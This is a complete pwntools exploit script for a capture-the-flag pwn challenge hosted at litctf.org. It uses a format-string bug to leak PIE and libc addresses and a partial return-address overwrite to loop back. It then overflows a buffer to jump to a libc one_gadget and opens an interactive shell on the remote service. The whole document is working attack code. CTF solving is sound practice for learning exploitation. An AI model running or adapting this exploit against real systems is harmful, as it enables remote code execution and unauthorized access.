#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('s')
libc = ELF('libc.so.6')

host = args.HOST or 'litctf.org'
port = int(args.PORT or 31790)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    #if args.GDB:
    #    return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    #else:
    return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

def discover():
    for i in range(30):
        io = start(level='error')
        io.sendline(f'%{i}$p'.encode())
        print(i,io.recvall())

context.terminal = ['xfce4-terminal','-e']
gdbscript = '''
b *main+144
continue
'''.format(**locals())

# -- Exploit goes here --
# discover()

while True:
    io = start()

    """
    +4
    4:  0x7fffffffd978 = 0x5555555550e0 (_start)
    8:  0x7ffd1c586e88 = 0x7fc07369c083 (__libc_start_main+243)
    10: 0x7ffd1c586e98 = 0x7ffd1c586f78 —▸ 0x7ffd1c587e7b
    38: 0x7ffd1c586f78 = 0x7ffd1c587e7b
    """

    OFFSET = cyclic_find(0x6161616161616168, n=8)

    p =  b'%8$p %12$p '
    p += b'A'*(OFFSET-30)
    p += b'\x7c'

    io.sendline(p)

    data = io.recvline()
    try: 
        io.recvline(timeout=1)
        leak_pie, leak_libc, _ = data.split()
        leak_pie, leak_libc = int(leak_pie,16), int(leak_libc,16)
        exe.address = leak_pie - exe.sym['_start']
        libc.address = leak_libc - (libc.sym['__libc_start_main'] + 243)
        log.success(f'{exe.address = :x} {libc.address = :x}')

        if args.LOCAL and args.GDB:
            my_gdb  = gdb.attach(io, gdbscript=gdbscript)

        p = b'A'*(OFFSET-0)
        p += p64(libc.address + 0xe3b01)
        io.sendline(p)

        io.interactive()
        
    except EOFError:
        continue

io.interactive()

